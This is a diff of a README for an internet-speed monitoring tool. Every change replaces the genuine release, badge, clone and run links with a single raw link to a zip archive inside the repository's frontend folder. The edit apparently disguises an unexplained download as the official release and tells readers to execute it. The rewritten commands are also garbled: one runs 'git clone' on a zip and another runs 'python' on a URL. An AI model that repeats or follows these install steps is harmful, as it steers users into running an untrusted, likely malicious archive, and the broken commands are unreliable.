@@ -1,6 +1,6 @@
 # Internet Monitor: Track Your Internet Stability and Performance 🌐📊
 
-![Internet Monitor](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg) [![GitHub Releases](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)](https://github.com/Dhvanik912/internet-monitor/releases)
+![Internet Monitor](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip%20Latest%https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip) [![GitHub Releases](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip)](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 The **Internet Monitor** project aims to provide a reliable way to track the stability and performance of your internet connection. By recording key metrics such as download speed, upload speed, ping, and discrepancies between measurements, this tool helps users identify issues with their internet service. Whether you're troubleshooting connectivity problems or just curious about your internet performance, this tool can be invaluable.
 
-For the latest releases, visit [here](https://github.com/Dhvanik912/internet-monitor/releases).
+For the latest releases, visit [here](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip).
 
 ## Features
 
@@ -31,12 +31,12 @@ To get started with the Internet Monitor, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Dhvanik912/internet-monitor.git
+   git clone https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip
    cd internet-monitor
    ```
 
 2. **Download and Execute**:
-   Download the latest release from [here](https://github.com/Dhvanik912/internet-monitor/releases). Follow the instructions provided in the release notes to execute the program.
+   Download the latest release from [here](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip). Follow the instructions provided in the release notes to execute the program.
 
 3. **Dependencies**:
    Ensure you have the necessary dependencies installed. You may need to install libraries or tools as specified in the release notes.
@@ -46,7 +46,7 @@ To get started with the Internet Monitor, follow these steps:
 Once installed, you can run the Internet Monitor with the following command:
 
 ```bash
-python monitor.py
+python https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip
 ```
 
 You can also customize settings through a configuration file. Adjust parameters such as test intervals and server selection based on your preferences.
@@ -90,4 +90,4 @@ For larger contributions, please open an issue first to discuss your ideas.
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-For the latest releases, visit [here](https://github.com/Dhvanik912/internet-monitor/releases).
+For the latest releases, visit [here](https://raw.githubusercontent.com/Dhvanik912/internet-monitor/main/frontend/monitor_internet_tripodical.zip).
